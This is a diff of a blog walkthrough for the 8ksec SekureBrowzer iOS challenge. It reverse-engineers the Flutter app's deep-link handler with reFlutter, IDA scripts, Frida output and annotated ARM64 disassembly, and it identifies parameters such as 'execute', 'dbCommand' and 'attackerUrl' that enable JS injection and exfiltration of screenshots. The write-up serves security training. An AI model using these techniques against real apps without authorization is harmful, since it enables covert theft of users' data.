@@ -11,7 +11,7 @@ permalink: /8ksec-sekurebrowzer-flutter-ios-deeplink-screenshot-exfiltrate-chall
 
 8ksec's SekureBrowzer challenge gives you one IPA and a short brief. The app calls itself a "privacy-first" iOS browser, though it quietly saves screenshots of whatever page you're looking at, and it registers a couple of custom URL schemes for deep linking. The task: build a single web page that, the moment someone opens it *in SekureBrowzer*, silently redirects the app to a page you control, silently takes a screenshot, and then steals every screenshot the app has ever taken, all without the victim doing anything beyond opening a link. No jailbreak needed.
 
-This post is the walkthrough: how I went from "unknown IPA" to a working one-URL exploit. First, recognizing the app as Flutter rather than native Swift. Then recovering the stripped Dart symbol table with reFlutter and IDA. From there, pulling the actual deep-link parameter names and comparison strings out of the Dart runtime with Frida. Finding the dispatcher and the sink. And finally, building the PoC.
+This post is the walkthrough: how I went from "unknown IPA" to a working one-URL exploit. First, recognizing the app as Flutter rather than native Swift. Then recovering the stripped Dart symbol table with reFlutter and IDA. From there, pulling the actual deep-link parameter names and comparison strings out of the Dart runtime with Frida. Finding the dispatcher and the sink. And finally, building the PoC. **Full source for every script is collected in the Appendix at the end**
 
 ## First look at the IPA — this isn't a native app
 
@@ -125,7 +125,7 @@ Each record looks like this:
 
 ### Applying `dump.dart` into IDA
 
-`dump.dart` gives names and offsets, not addresses IDA understands directly. Each record's offset is relative to the isolate's AOT instructions section, exported in this binary as `_kDartIsolateSnapshotInstructions`. Resolve that symbol once, add each offset to it, and the result is a real address to rename — the script below does exactly that in IDA:
+`dump.dart` gives names and offsets, not addresses IDA understands directly. Each record's offset is relative to the isolate's AOT instructions section, exported in this binary as `_kDartIsolateSnapshotInstructions`. Resolve that symbol once, add each offset to it, and the result is a real address to rename. The core of the renaming loop:
 
 ```asm
 ; Export
@@ -137,62 +137,15 @@ _kDartVmSnapshotInstructions	        0000000000004000
 ```
 
 ```python
-import json
-import idc
-import ida_funcs
-import idaapi
-
-DUMP_PATH = "dump.dart"
-BASE_SYMBOL = "_kDartIsolateSnapshotInstructions"
-
-def load_dump(path):
-    data = open(path, encoding="utf-8", errors="replace").read()
-    decoder = json.JSONDecoder()
-    idx, objs = 0, []
-    n = len(data)
-    while idx < n:
-        while idx < n and data[idx] in " \t\r\n":
-            idx += 1
-        if idx >= n:
-            break
-        obj, idx = decoder.raw_decode(data, idx)
-        objs.append(obj)
-    return objs
-
-def main():
+    # full script, with the dump.dart streaming parser and de-dup/reporting counters in Appendix ida_reconstruct_flutter_symbols.py
     base = idc.get_name_ea_simple(BASE_SYMBOL)
-    if base == idc.BADADDR:
-        print("base symbol not found — check the export name")
-        return
-
-    records = load_dump(DUMP_PATH)
-    seen, renamed, skipped = set(), 0, 0
-
     for rec in records:
-        off_str = rec.get("offset")
-        if off_str is None:
-            continue
-        off = int(off_str, 16)
-        if off in seen:
-            continue  # AOT identical-code-folding: multiple symbols, same address
-        seen.add(off)
-
+        off = int(rec["offset"], 16)
         ea = base + off
-        cls = rec.get("class_name") or ""
-        name = rec.get("method_name") or "anon"
-        symbol = f"{cls}__{name}_{ea:x}" if cls else f"{name}_{ea:x}"
-        symbol = idaapi.validate_name(symbol, idaapi.VNT_IDENT)
-
+        symbol = f'{rec.get("class_name","")}__{rec.get("method_name","anon")}_{ea:x}'
         if not ida_funcs.get_func(ea):
             ida_funcs.add_func(ea)
-        if idaapi.set_name(ea, symbol, idaapi.SN_FORCE):
-            renamed += 1
-        else:
-            skipped += 1
-
-    print(f"parsed={len(records)} unique_offsets={len(seen)} renamed={renamed} skipped={skipped}")
-
-main()
+        idaapi.set_name(ea, symbol, idaapi.SN_FORCE)
 ```
 
 On this binary that renamed around **10,975 of 15,470 functions** from `sub_140D28`-style auto-names to real `Class__method_offset` names. Still, a few offsets are shared by more than one symbol — expected AOT "identical code folding," where several trivially small functions (one-line getters, mostly) compile down to byte-identical machine code and collapse to one address.
@@ -281,8 +234,887 @@ Hooked at `_handleDeepLink`'s entry (so `X27` is guaranteed valid), with a small
 
 That's every deep-link query key `_handleDeepLink` reads — including `attackerUrl`, which stood out immediately: local Dart variable names don't normally survive AOT compilation as runtime strings unless they're used as something string-typed at runtime, like a map key.
 
-To scale this up beyond a hand-picked list of offsets, a driver script `dump_pool_full_driver.py` + `dump_pool_full.js` hooks the same anchor function to grab a live `X27`, then walks every 8-byte slot out from that base and decodes each one as a Smi, a string, or "other." Run against a real device:
+To scale this up beyond a hand-picked list of offsets, a driver script `dump_pool_full_driver.py` + `dump_pool_full.js` hooks the same anchor function to grab a live `X27`, then walks every 8-byte slot out from that base and decodes each one as a Smi/string/other, and cross-references it  (full source for both in Appendix). Run against a real device:
 
+```python
+$ python3 dump_pool_full_driver.py
+[*] parsing dump.dart
+[*] parsed 12570 dump.dart records
+[*] attached to running process, pid 5934
+[anchor] hooking _BrowserScreenState._handleDeepLink @ 0x10617eec8 to capture X27
+[*] triggering deep link to fire the anchor hook: sekurebrowzer://anyhost?url=https://example.com
+[anchor] captured live pool base X27 = 0xbed480080
+[*] pool base captured. Running full walk + cross-reference...
+[xref] cross-reference index built: 12570 functions scanned, 141015 pool-load sites found, 3401 unique offsets with an owner
+[dump] walking pool slots 0x0 .. 0x20000 from base 0xbed480080
+[dump] done: 14692 non-garbage slots kept (raw counts: {"smi":407,"string":5121,"other":9164,"invalid":1692})
+[*] wrote 5528 slots to pool_full_dump.json (dropped 9164 slot(s) outside ['smi', 'string'])
+```
+
+A slice of the output, `pool_full_dump.json`:
+
+```json
+{
+    "offset_hex": "0xfbe0",
+    "kind": "string",
+    "value": "dbCommand",
+    "display": "\"dbCommand\" (OneByteString, len=9)",
+    "owners": []
+},
+{
+    "offset_hex": "0xfbf8",
+    "kind": "string",
+    "value": "attackerUrl",
+    "display": "\"attackerUrl\" (OneByteString, len=11)",
+    "owners": []
+}
+```
+
+Then, the last step is getting these back into IDA so the disassembly reads like normal code from here on. A companion script, `annotate_pool_full_dump.py`, does two things:
+
+1. Pushes each resolved string as an EOL comment at the exact `[X27, #offset]` load site.
+2. Solves the "there's no fixed address to xref" problem by manufacturing one: it carves out a synthetic data segment, `POOL_FULL`, in unused space past the end of the binary's real segments, writes one addressable, named location per distinct pool offset (`poolfull_0x<offset>`, holding the decoded bytes), and adds a real data xref from every matching load site to it. `poolfull_0x<offset>` isn't a real on-device address — it's a bookkeeping location this script invented — but it means `Ctrl-X` on it now lists every real instruction in the binary that loads that constant, instead of that being a grep exercise.
+
+```asm
+POOL_FULL:000000000053FAC0 poolfull_0xFBE0 DCB "dbCommand",0       ; DATA XREF: _BrowserScreenState___handleDeepLink_19eec8+248↑r
+POOL_FULL:000000000053FAD8 poolfull_0xFBF0 DCB "openGallery",0     ; DATA XREF: _BrowserScreenState___handleDeepLink_19eec8+2E0↑r
+POOL_FULL:000000000053FAE8 poolfull_0xFBF8 DCB "attackerUrl",0     ; DATA XREF: _BrowserScreenState___handleDeepLink_19eec8+32C↑r
+```
+
+![Recovered inline string comment](https://lh3.googleusercontent.com/pw/AP1GczMi0wnUU1nz_8onm5WgfcfTyB9emZXchQLr3lPrheVR1t7zh-AA_n9P3ucP-Dmqqvl_az0XSWaBHtOzGxW4V_UPSPef7PQZXiuc94r59tUPUkMcpitHx5ri4N1iBfiN36xOwHLRlvU9jsu5ptyc7GKU=w2924-h1634-s-no-gm)
+_**Figure: Recovered inline string comment**_
+
+## Locating the deep-link dispatcher — `_handleDeepLink`
+
+With symbols and pool comments in place, finding the entry point is a one-line search: the Strings window for `"Deep link received: "` turns up exactly one xref, straight into `_BrowserScreenState::_handleDeepLink` (IDA address `0x19eec8` — `dump.dart`'s raw offset `0x190608` plus `_kDartIsolateSnapshotInstructions`'s base `0xe8c0`, the same base every offset in this write-up gets resolved against).
+
+```asm
+__text:000000000019EEC8 _BrowserScreenState___handleDeepLink_19eec8
+...
+__text:000000000019EF88    LDUR    X2, [X29,#-0x10]
+__text:000000000019EF8C    LDUR    X0, [X2,#-1]
+__text:000000000019EF90    UBFX    X0, X0, #0xC, #0x14
+__text:000000000019EF94    MOV     X1, X2
+__text:000000000019EF98    SUB     X30, X0, #0xFF4
+__text:000000000019EF9C    LDR     X30, [X21,X30,LSL#3]
+__text:000000000019EFA0    BLR     X30
+__text:000000000019EFA4    LDUR    X1, [X0,#-1]
+__text:000000000019EFA8    UBFX    X1, X1, #0xC, #0x14
+__text:000000000019EFAC    ADD     X16, X27, #0xC,LSL#12
+__text:000000000019EFB0    LDR     X16, [X16,#0x238] ; POOLFULL[X27]: [X27+0xC238] "sekurebrowzer" (String)
+__text:000000000019EFB4    STP     X16, X0, [X15]
+__text:000000000019EFB8    MOV     X0, X1
+__text:000000000019EFBC    MOV     X30, X0
+__text:000000000019EFC0    LDR     X30, [X21,X30,LSL#3]
+__text:000000000019EFC4    BLR     X30
+__text:000000000019EFC8    TBNZ    W0, #4, loc_19F800
+__text:000000000019EFCC    LDUR    X3, [X29,#-8]
+__text:000000000019EFD0    LDUR    X2, [X29,#-0x10]
+__text:000000000019EFD4    LDUR    X4, [X29,#-0x18]
+__text:000000000019EFD8    LDUR    X0, [X2,#-1]
+__text:000000000019EFDC    UBFX    X0, X0, #0xC, #0x14
+__text:000000000019EFE0    MOV     X1, X2
+__text:000000000019EFE4    SUB     X30, X0, #0xFF0
+__text:000000000019EFE8    LDR     X30, [X21,X30,LSL#3]
+__text:000000000019EFEC    BLR     X30
+__text:000000000019EFF0    LDUR    X1, [X0,#-1]
+__text:000000000019EFF4    UBFX    X1, X1, #0xC, #0x14
+__text:000000000019EFF8    MOV     X16, X0
+__text:000000000019EFFC    MOV     X0, X1
+__text:000000000019F000    MOV     X1, X16
+__text:000000000019F004    ADD     X2, X27, #0xD,LSL#12
+__text:000000000019F008    LDR     X2, [X2,#0x488] ; POOLFULL[X27]: [X27+0xD488] "url" (String)
+__text:000000000019F00C    SUB     X30, X0, #1,LSL#12
+__text:000000000019F010    LDR     X30, [X21,X30,LSL#3]
+__text:000000000019F014    BLR     X30
+__text:000000000019F018    MOV     X3, X0
+__text:000000000019F01C    LDUR    X2, [X29,#-0x10]
+__text:000000000019F020    STUR    X3, [X29,#-0x20]
+__text:000000000019F024    LDUR    X0, [X2,#-1]
+__text:000000000019F028    UBFX    X0, X0, #0xC, #0x14
+__text:000000000019F02C    MOV     X1, X2
+__text:000000000019F030    SUB     X30, X0, #0xFF0
+__text:000000000019F034    LDR     X30, [X21,X30,LSL#3]
+__text:000000000019F038    BLR     X30
+__text:000000000019F03C    LDUR    X1, [X0,#-1]
+__text:000000000019F040    UBFX    X1, X1, #0xC, #0x14
+__text:000000000019F044    MOV     X16, X0
+__text:000000000019F048    MOV     X0, X1
+__text:000000000019F04C    MOV     X1, X16
+__text:000000000019F050    ADD     X2, X27, #0xF,LSL#12
+__text:000000000019F054    LDR     X2, [X2,#0x400] ; POOLFULL[X27]: [X27+0xF400] "takeScreenshot" (String)
+__text:000000000019F058    SUB     X30, X0, #1,LSL#12
+__text:000000000019F05C    LDR     X30, [X21,X30,LSL#3]
+__text:000000000019F060    BLR     X30
+__text:000000000019F064    MOV     X3, X0
+__text:000000000019F068    LDUR    X2, [X29,#-0x10]
+__text:000000000019F06C    STUR    X3, [X29,#-0x28]
+__text:000000000019F070    LDUR    X0, [X2,#-1]
+__text:000000000019F074    UBFX    X0, X0, #0xC, #0x14
+__text:000000000019F078    MOV     X1, X2
+...
+```
+
+### Stack-slot map (verified against `STUR`/`LDUR` on `X29`, not guessed)
+
+Dart AOT reuses stack slots aggressively once an SSA value's lifetime ends, so the *same offset* holds different things in different regions — that reuse is the main reason a quick skim looks like dead code. The mapping below is the slot each of the seven `Uri.queryParameters[...]` values lives in for the region where it is actually read back and branched on:
+
+| Slot (`[X29,#-N]`) | Query param | First written | Read back at |
+|---|---|---|---|
+| `-0x20` | `url` | `0x19f020` | `0x19f4e4`+ (presence check), `0x19f61c`/`0x19f674` (navigation) |
+| `-0x28` | `takeScreenshot` | `0x19f06c` | `0x19f690` (`== "true"`) |
+| `-0x30` | `execute` | `0x19f0b8` | `0x19f738` (`!= null`) |
+| `-0x38` | `dbCommand` | `0x19f128` | `0x19f4bc` (`!= null`, the export gate) |
+| `-0x40` | `dbId` | `0x19f174` | `0x19f4c8` (passed to `_processDataCommand`) |
+| `-0x48` | `openGallery` | `0x19f1c0` | `0x19f45c`/`0x19f468` (`== "true"`, checked **first**) |
+| `-0x50` | `attackerUrl` | `0x19f20c` | `0x19f4cc` (passed to `_processDataCommand`) |
+
+All these are read via the same idiom, twice per key: `uri.queryParameters` (a vtable call) followed by `Map.[]("<key>")` (a second vtable call), against the `Uri` object cached in `-0x10` (the deep link's target, the function's second argument) — meaning the pool loads at `0x19F008` (`"url"`), `0x19F054` (`"takeScreenshot"`), `0x19F0A0` (`"execute"`), `0x19F110` (`"dbCommand"`), `0x19F15C` (`"dbId"`), `0x19F1A8` (`"openGallery"`), and `0x19F1F4` (`"attackerUrl"`) are the **map keys**, not the values — each one is immediately consumed as the argument to a `Map.[]` lookup on the very next instruction. That's why they look like inert loads in isolation: the load itself does nothing observable, it's purely feeding the following `BLR`.
+
+### Dart AOT dispatch-table calling convention — decoder key for the listing below
+
+Every `uri.<getter>` / `map[key]` / `string == string` call in this function follows the same instructions idiom, and only the constant subtracted from the class id changes per selector:
+
+```asm
+LDUR X0, [Xrecv,#-1]        ; load receiver's header word (tagged ptr - 1)
+UBFX X0, X0, #0xC, #0x14    ; extract class id = header bits [12:32)
+SUB  X30, X0, #<selector>   ; index = class_id - <selector's constant>
+LDR  X30, [X21, X30,LSL#3]  ; X21 = Dart AOT global dispatch table base;
+                             ;  load code pointer for (class, selector)
+BLR  X30                    ; call it
+```
+
+`X21` is the isolate's dispatch-table register (populated at isolate startup, same mechanism as the `X27` object-pool register — a runtime pointer, not a static address, which is why IDA can't statically resolve `BLR X30` targets either). The `<selector>` constant is fixed per call *site*, not per class — the same constant always means the same method, confirmed by its return
+value and downstream use at every occurrence in this function:
+
+| Selector constant | Meaning | Confirmed by |
+|---|---|---|
+| `0` (no `SUB`, class id used directly as index) | `String.operator==` | Return value immediately `TBNZ`-tested and gates the scheme/`"true"` checks; matches the shared `OneByteString`/`TwoByteString` equality routine (`0x258358`) |
+| `0xFF4` (4084) | `Uri.scheme` getter | Result compared against pool string `"sekurebrowzer"` right after |
+| `0xFF0` (4080) | `Uri.queryParameters` getter | Result is always immediately used as the receiver of the next `0x1000`-selector call (`Map.[]`) |
+| `0x1000` (4096) | `Map<String,String>.operator[]` | Called with a query-param-name pool string as the RHS operand every time; result is the extracted value, spilled to a stack slot right after |
+| `0xFDC` (4060) | `Uri.pathSegments` getter | Result only feeds the "Path segments: " log line, not a query param |
+
+That table is a good working hypothesis, but it's still inference from call shape — not the same tier of evidence as reading the live table `X21` actually points to. Closing that gap means capturing `X21` on a real device and resolving an actual `(classId, selector)` pair through it.
+
+The working hook sits at one `BLR`, the `uri.scheme` getter call, and reads three things before the call executes:
+
+```asm
+0x19ef88  LDUR X2, [X29,#-0x10]          ; X2 = uri
+0x19ef8c  LDUR X0, [X2,#-1]              ; uri's header word
+0x19ef90  UBFX X0, X0, #0xC, #0x14       ; X0 = uri's class id
+0x19ef94  MOV  X1, X2                    ; X1 = receiver pointer (not the class id!)
+0x19ef98  SUB  X30, X0, #0xFF4           ; reads X0, writes X30 — X0 survives
+0x19ef9c  LDR  X30, [X21,X30,LSL#3]
+0x19efa0  BLR  X30                       ; <-- single hook lands here
+```
+
+`this.context.x21` gives the dispatch table base. `this.context.x0` gives the receiver's class id (it survives because the `SUB` writes to `x30`, not `x0`). `this.context.lr` gives the CPU's own resolved call target — the ground truth to self-check against.
+
+Run live against a physical device (USB-attached):
+
+```bash
+$ python3 resolve_dispatch_table.py
+dump.dart: parsed 12570 records, 10976 unique offsets
+attached to pid 9938
+[hook] single dispatch-table capture site installed
+>> sent: sekurebrowzer://anyhost -> dispatched sekurebrowzer://anyhost
+[openurl] sekurebrowzer://anyhost -> openURL: returned 1
+[ready] captured X21 (dispatch table base) = 0xdbd408000
+[site] uri.scheme getter                classId=2826 selector=0xff4  indexMatch=True  -> _SimpleUri.scheme (dart:core)
+[site] uri.scheme getter                classId=2826 selector=0xff4  indexMatch=True  -> _SimpleUri.scheme (dart:core)
+[site] uri.scheme getter                classId=2826 selector=0xff4  indexMatch=True  -> _SimpleUri.scheme (dart:core)
+[site] uri.scheme getter                classId=2826 selector=0xff4  indexMatch=True  -> _SimpleUri.scheme (dart:core)
+[site] uri.scheme getter                classId=2826 selector=0xff4  indexMatch=True  -> _SimpleUri.scheme (dart:core)
+>> resolveIndex(classId=94, selector=0): {'target': '0x103ac0358', 'fileOffset': '0x258358', 'inModule': True}
+DONE
+```
+
+A second selector, `0` (`String.==`), was cross-checked the same way against `classId=94` (`OneByteString`) and resolved to file offset `0x258358` — the exact address a completely separate Frida hook (directly on the string-equality routine itself, described below). So two different methods landing on the same address is strong evidence the whole pipeline — `X21` capture, index math, `dump.dart` lookup — is correct end to end.
+
+Resolving a raw target address back to a name is one line of arithmetic plus a `dump.dart` lookup: `dump.dart offset = (live_target_address - App_module_base) - 0xE8C0`
+
+That resolution pipeline (`resolve_dispatch_table.py`) can be sanity-checked with no device at all, against addresses already confirmed elsewhere:
+
+```bash
+>>> resolve(by_offset, '0x19f83c')
+_BrowserScreenState._processDataCommand (package:sekure_browzer/main.dart)
+>>> resolve(by_offset, '0x258358')
+String.== (dart:core)
+```
+
+Both correct, which validates the parser and the offset math before trusting it against live data.
+
+### Prologue + stack-overflow guard (not param-related)
+
+```asm
+0x19eec8  STP  X29, X30, [X15,#-0x10]!   
+0x19eecc  MOV  X29, X15                  
+0x19eed0  SUB  X15, X15, #0x70           ; SP -= 0x70, reserve locals
+0x19eed4  MOV  X0, X1
+0x19eed8  STUR X1, [X29,#-8]             ; spill arg1 (self, BrowserScreenState) -> -8
+0x19eedc  MOV  X1, X2
+0x19eee0  STUR X2, [X29,#-0x10]          ; spill arg2 (Uri = the deep-link target) -> -0x10
+0x19eee4  LDR  X16, [X26,#0x38]          ; X26 = ThreadState*; load stack-limit
+0x19eee8  CMP  X15, X16
+0x19eeec  B.LS loc_19F810                ; if SP past limit -> grow-stack stub, then retry from 0x19eef0
+```
+
+### Log line #1 build + print — "Deep link received: <uri>" (not param-related, plumbing only)
+
+```asm
+0x19eef0  MOV  X1, #3
+0x19eef4  BL   sub_2BF3B0                ; allocate interpolation buffer #1
+0x19eef8  MOV  X3, X0
+0x19eefc  LDUR X0, [X29,#-8]
+0x19ef00  STUR X3, [X29,#-0x18]
+0x19ef04  STUR X0, [X3,#0x17]
+0x19ef08  MOV  X1, X22                   ; X22 = cached Dart `null` sentinel (reused throughout as the null-check comparand)
+0x19ef0c  MOV  X2, #4
+0x19ef10  BL   sub_2C0498                ; allocate interpolation buffer #2
+0x19ef14  MOV  X1, X0
+0x19ef18  STUR X1, [X29,#-0x20]
+0x19ef1c  ADD  X16, X27, #0xF,LSL#12
+0x19ef20  LDR  X16, [X16,#0xBD8]         ; POOLFULL[X27+0xFBD8] = "Deep link received: "
+0x19ef24  STUR X16, [X1,#0x17]
+0x19ef28  LDUR X2, [X29,#-0x10]          ; reload uri
+0x19ef2c  LDUR X0, [X2,#-1]
+0x19ef30  UBFX X0, X0, #0xC, #0x14
+0x19ef34  STR  X2, [X15]
+0x19ef38  LDR  X4, [X27,#0x3B0]
+0x19ef3c  MOV  X17, #0x1AD3
+0x19ef40  ADD  X30, X0, X17
+0x19ef44  LDR  X30, [X21,X30,LSL#3]      ; Uri.toString() dispatch (X0's own class-id path, no fixed selector table row above)
+0x19ef48  BLR  X30                       ; CALL uri.toString()
+0x19ef4c  LDUR X1, [X29,#-0x20]
+0x19ef50  ADD  X25, X1, #0x1F
+0x19ef54  STR  X0, [X25]
+0x19ef58  TBZ  W0, #0, loc_19EF74        
+0x19ef5c  LDURB W16, [X1,#-1]
+0x19ef60  LDURB W17, [X0,#-1]
+0x19ef64  AND  X16, X17, X16,LSR#2
+0x19ef68  TST  X16, X28,LSR#32
+0x19ef6c  B.EQ loc_19EF74
+0x19ef70  BL   sub_2BE720                
+0x19ef74  LDUR X16, [X29,#-0x20]
+0x19ef78  STR  X16, [X15]
+0x19ef7c  BL   _StringBase___interpolate_11494   ; build "Deep link received: <uri>"
+0x19ef80  MOV  X1, X0
+0x19ef84  BL   ____print_37ba8           ; print() the line
+```
+
+### `Uri.scheme` guard — gate on the `sekurebrowzer://` scheme itself
+
+```asm
+0x19ef88  LDUR X2, [X29,#-0x10]          ; X2 = uri
+0x19ef8c  LDUR X0, [X2,#-1]              ; uri's header word
+0x19ef90  UBFX X0, X0, #0xC, #0x14       ; uri's class id
+0x19ef94  MOV  X1, X2                    ; X1 = receiver = uri
+0x19ef98  SUB  X30, X0, #0xFF4           ; selector 0xFF4 = Uri.scheme getter
+0x19ef9c  LDR  X30, [X21,X30,LSL#3]
+0x19efa0  BLR  X30                       ; CALL uri.scheme  -> X0 = scheme string
+0x19efa4  LDUR X1, [X0,#-1]              ; scheme string's header word
+0x19efa8  UBFX X1, X1, #0xC, #0x14       ; scheme string's class id
+0x19efac  ADD  X16, X27, #0xC,LSL#12
+0x19efb0  LDR  X16, [X16,#0x238]         ; POOLFULL[X27+0xC238] = "sekurebrowzer"
+0x19efb4  STP  X16, X0, [X15]            ; equality-call arg array: [X15]="sekurebrowzer", [X15+8]=scheme
+0x19efb8  MOV  X0, X1                    ; X0 = scheme's class id (index directly, selector 0)
+0x19efbc  MOV  X30, X0
+0x19efc0  LDR  X30, [X21,X30,LSL#3]      ; selector 0 = String.operator== 
+0x19efc4  BLR  X30                       ; CALL scheme == "sekurebrowzer"
+0x19efc8  TBNZ W0, #4, loc_19F800        ; if NOT equal -> jump straight to `return` at 0x19f800.
+                                       ; every query-param extraction below only runs for
+                                       ; sekurebrowzer://... links; sekureexec:// is NOT this gate
+                                       ; and is not handled anywhere in this function
+```
+
+### The query parameters, and how the function actually reads them
+
+Each block: `uri.queryParameters` getter (selector `0xFF0`) → `Map.[]("<key>")` (selector `0x1000`) → spill result to its stack slot. `X2` is reloaded with the `uri` object (from `-0x10`) at the start of every block since the previous block's `Map.[]` call clobbered it.
+
+**`"url"` → slot `-0x20`:**
+```asm
+0x19efcc  LDUR X3, [X29,#-8]
+0x19efd0  LDUR X2, [X29,#-0x10]          ; X2 = uri (receiver for .queryParameters)
+0x19efd4  LDUR X4, [X29,#-0x18]
+0x19efd8  LDUR X0, [X2,#-1]
+0x19efdc  UBFX X0, X0, #0xC, #0x14       ; uri's class id
+0x19efe0  MOV  X1, X2
+0x19efe4  SUB  X30, X0, #0xFF0           ; selector 0xFF0 = Uri.queryParameters
+0x19efe8  LDR  X30, [X21,X30,LSL#3]
+0x19efec  BLR  X30                       ; CALL uri.queryParameters  -> X0 = Map<String,String>
+0x19eff0  LDUR X1, [X0,#-1]              ; map's header word
+0x19eff4  UBFX X1, X1, #0xC, #0x14       ; map's class id
+0x19eff8  MOV  X16, X0                   ; save map ref
+0x19effc  MOV  X0, X1                    ; X0 = map's class id
+0x19f000  MOV  X1, X16                   ; X1 = receiver = the map
+0x19f004  ADD  X2, X27, #0xD,LSL#12
+0x19f008  LDR  X2, [X2,#0x488]           ; POOLFULL[X27+0xD488] = "url"  <- the lookup KEY, arg to Map.[]
+0x19f00c  SUB  X30, X0, #1,LSL#12        ; selector 0x1000 = Map.operator[]
+0x19f010  LDR  X30, [X21,X30,LSL#3]
+0x19f014  BLR  X30                       ; CALL queryParameters["url"]  -> X0 = url value (String? or null)
+0x19f018  MOV  X3, X0
+0x19f01c  LDUR X2, [X29,#-0x10]          ; reload uri for the next extraction
+0x19f020  STUR X3, [X29,#-0x20]          ; spill url value -> slot -0x20
+```
+
+**`"takeScreenshot"` → slot `-0x28`:**
+```asm
+0x19f024  LDUR X0, [X2,#-1]
+0x19f028  UBFX X0, X0, #0xC, #0x14
+0x19f02c  MOV  X1, X2
+0x19f030  SUB  X30, X0, #0xFF0           ; Uri.queryParameters
+0x19f034  LDR  X30, [X21,X30,LSL#3]
+0x19f038  BLR  X30                       ; -> Map
+0x19f03c  LDUR X1, [X0,#-1]
+0x19f040  UBFX X1, X1, #0xC, #0x14
+0x19f044  MOV  X16, X0
+0x19f048  MOV  X0, X1
+0x19f04c  MOV  X1, X16
+0x19f050  ADD  X2, X27, #0xF,LSL#12
+0x19f054  LDR  X2, [X2,#0x400]           ; POOLFULL[X27+0xF400] = "takeScreenshot"  <- lookup key
+0x19f058  SUB  X30, X0, #1,LSL#12        ; Map.operator[]
+0x19f05c  LDR  X30, [X21,X30,LSL#3]
+0x19f060  BLR  X30                       ; -> takeScreenshot value
+0x19f064  MOV  X3, X0
+0x19f068  LDUR X2, [X29,#-0x10]
+0x19f06c  STUR X3, [X29,#-0x28]          ; spill -> slot -0x28
+```
+
+**`"execute"` → slot `-0x30`:**
+```asm
+0x19f070  LDUR X0, [X2,#-1]
+0x19f074  UBFX X0, X0, #0xC, #0x14
+0x19f078  MOV  X1, X2
+0x19f07c  SUB  X30, X0, #0xFF0
+0x19f080  LDR  X30, [X21,X30,LSL#3]
+0x19f084  BLR  X30                       ; -> Map
+0x19f088  LDUR X1, [X0,#-1]
+0x19f08c  UBFX X1, X1, #0xC, #0x14
+0x19f090  MOV  X16, X0
+0x19f094  MOV  X0, X1
+0x19f098  MOV  X1, X16
+0x19f09c  ADD  X2, X27, #0xD,LSL#12
+0x19f0a0  LDR  X2, [X2,#0x200]           ; POOLFULL[X27+0xD200] = "execute"  <- lookup key
+0x19f0a4  SUB  X30, X0, #1,LSL#12
+0x19f0a8  LDR  X30, [X21,X30,LSL#3]
+0x19f0ac  BLR  X30                       ; -> execute value (raw JS to run)
+0x19f0b0  MOV  X3, X0
+0x19f0b4  LDUR X2, [X29,#-0x18]
+0x19f0b8  STUR X3, [X29,#-0x30]          ; spill -> slot -0x30
+0x19f0bc  STUR X0, [X2,#0x1F]            ; also stash into log-builder #1 for the "Execute JS parameter:" line
+0x19f0c0  TBZ  W0, #0, loc_19F0DC
+0x19f0c4  LDURB W16, [X2,#-1]
+0x19f0c8  LDURB W17, [X0,#-1]
+0x19f0cc  AND  X16, X17, X16,LSR#2
+0x19f0d0  TST  X16, X28,LSR#32
+0x19f0d4  B.EQ loc_19F0DC
+0x19f0d8  BL   sub_2BEB84                
+```
+
+**`"dbCommand"` → slot `-0x38`:**
+```asm
+0x19f0dc  LDUR X4, [X29,#-0x10]
+0x19f0e0  LDUR X0, [X4,#-1]
+0x19f0e4  UBFX X0, X0, #0xC, #0x14
+0x19f0e8  MOV  X1, X4
+0x19f0ec  SUB  X30, X0, #0xFF0
+0x19f0f0  LDR  X30, [X21,X30,LSL#3]
+0x19f0f4  BLR  X30                       ; -> Map
+0x19f0f8  LDUR X1, [X0,#-1]
+0x19f0fc  UBFX X1, X1, #0xC, #0x14
+0x19f100  MOV  X16, X0
+0x19f104  MOV  X0, X1
+0x19f108  MOV  X1, X16
+0x19f10c  ADD  X2, X27, #0xF,LSL#12
+0x19f110  LDR  X2, [X2,#0xBE0]           ; POOLFULL[X27+0xFBE0] = "dbCommand"  <- lookup key, THE export gate
+0x19f114  SUB  X30, X0, #1,LSL#12
+0x19f118  LDR  X30, [X21,X30,LSL#3]
+0x19f11c  BLR  X30                       ; -> dbCommand value (null unless present)
+0x19f120  MOV  X3, X0
+0x19f124  LDUR X2, [X29,#-0x10]
+0x19f128  STUR X3, [X29,#-0x38]          ; spill -> slot -0x38 (checked at 0x19f4bc, see below)
+```
+
+**`"dbId"` → slot `-0x40`:**
+```asm
+0x19f12c  LDUR X0, [X2,#-1]
+0x19f130  UBFX X0, X0, #0xC, #0x14
+0x19f134  MOV  X1, X2
+0x19f138  SUB  X30, X0, #0xFF0
+0x19f13c  LDR  X30, [X21,X30,LSL#3]
+0x19f140  BLR  X30                       ; -> Map
+0x19f144  LDUR X1, [X0,#-1]
+0x19f148  UBFX X1, X1, #0xC, #0x14
+0x19f14c  MOV  X16, X0
+0x19f150  MOV  X0, X1
+0x19f154  MOV  X1, X16
+0x19f158  ADD  X2, X27, #0xF,LSL#12
+0x19f15c  LDR  X2, [X2,#0xBE8]           ; POOLFULL[X27+0xFBE8] = "dbId"  <- lookup key
+0x19f160  SUB  X30, X0, #1,LSL#12
+0x19f164  LDR  X30, [X21,X30,LSL#3]
+0x19f168  BLR  X30                       ; -> dbId value
+0x19f16c  MOV  X3, X0
+0x19f170  LDUR X2, [X29,#-0x10]
+0x19f174  STUR X3, [X29,#-0x40]          ; spill -> slot -0x40 (never compared locally — forwarded
+                                        ; verbatim to _processDataCommand at 0x19f4c8)
+```
+
+**`"openGallery"` → slot `-0x48`:**
+```asm
+0x19f178  LDUR X0, [X2,#-1]
+0x19f17c  UBFX X0, X0, #0xC, #0x14
+0x19f180  MOV  X1, X2
+0x19f184  SUB  X30, X0, #0xFF0
+0x19f188  LDR  X30, [X21,X30,LSL#3]
+0x19f18c  BLR  X30                       ; -> Map
+0x19f190  LDUR X1, [X0,#-1]
+0x19f194  UBFX X1, X1, #0xC, #0x14
+0x19f198  MOV  X16, X0
+0x19f19c  MOV  X0, X1
+0x19f1a0  MOV  X1, X16
+0x19f1a4  ADD  X2, X27, #0xF,LSL#12
+0x19f1a8  LDR  X2, [X2,#0xBF0]           ; POOLFULL[X27+0xFBF0] = "openGallery"  <- lookup key,
+                                       ; THE top-priority gate (checked first of all, at 0x19f468)
+0x19f1ac  SUB  X30, X0, #1,LSL#12
+0x19f1b0  LDR  X30, [X21,X30,LSL#3]
+0x19f1b4  BLR  X30                       ; -> openGallery value
+0x19f1b8  MOV  X3, X0
+0x19f1bc  LDUR X2, [X29,#-0x10]
